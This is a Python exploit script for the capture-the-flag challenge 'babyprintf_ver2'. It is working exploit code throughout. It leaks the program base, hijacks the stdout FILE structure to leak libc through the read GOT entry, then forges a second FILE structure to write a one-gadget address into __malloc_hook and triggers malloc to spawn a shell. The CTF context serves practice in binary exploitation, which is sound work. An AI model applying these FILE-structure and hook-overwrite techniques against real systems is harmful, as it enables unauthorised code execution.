# File: exp.py
# Author: raycp
# Date: 2019-05-21
# Description: exp for babyprintf_ver2

from pwn_debug import *

pdbg=pwn_debug("babyprintf_ver2")

pdbg.context.terminal=['tmux', 'splitw', '-h']
#pdbg.context.log_level="debug"
pdbg.local("./libc64.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.24")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base
def do_one(data):
    p.send(data)
def pwn():
    #pdbg.bp([0x921])

    ## step 1 leak program base
    p.recvuntil("ion to ")
    pro_base=int(p.recvuntil("\n")[:-1],16)-0x202010
    log.info("leak pro base: %s"%hex(pro_base))

    ## step 2 arbitrary read to leak read address
    io_stdout_struct=IO_FILE_plus()
    #flag=0xfbad2887
    flag=0
    flag&=~8
    flag|=0x800
    flag|=0x8000
    io_stdout_struct._flags=flag
    io_stdout_struct._IO_write_base=pro_base+elf.got['read']
    io_stdout_struct._IO_read_end=io_stdout_struct._IO_write_base
    io_stdout_struct._IO_write_ptr=pro_base+elf.got['read']+8
    io_stdout_struct._fileno=1
    input_addr=pro_base+0x202010
    stdout_addr=pro_base+0x202020
    size=stdout_addr-input_addr
    log.info("stdout addr: %s"%hex(stdout_addr))
    io_stdout_struct.arbitrary_read_check("stdout")

    payload='a'*size
    payload+=p64(stdout_addr+8)
    payload+=str(io_stdout_struct)
    p.sendline(payload)
    p.recvuntil("tted!\n")
    libc_base=u64(p.recv(8))-libc.symbols['read']
    log.info("leak libc address: %s"%(hex(libc_base)))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    rce=libc_base+0xd6635  

    #pdbg.bp()
    
    ## step 3 arbitrary write to write one gadget to __malloc_hook
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    log.info("malloc hook: %s"%hex(malloc_hook))
    flag=0
    flag&=~8
    flag|=0x8000
    io_stdout_write=IO_FILE_plus()
    io_stdout_write._flags=flag
    io_stdout_write._IO_write_ptr=malloc_hook

    io_stdout_write._IO_write_end=malloc_hook+8
    io_stdout_write.arbitrary_write_check("stdout")
    #io_stdout_write.show()
    #p.recvuntil("tted!\n")
    payload=p64(rce)
    payload=payload.ljust(size,'\x00')
    payload+=p64(stdout_addr+8)
    payload+=str(io_stdout_write)
    p.sendline(payload)
    
    ## step 4 trigger malloc to get shell.
    p.sendline("%n") 
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


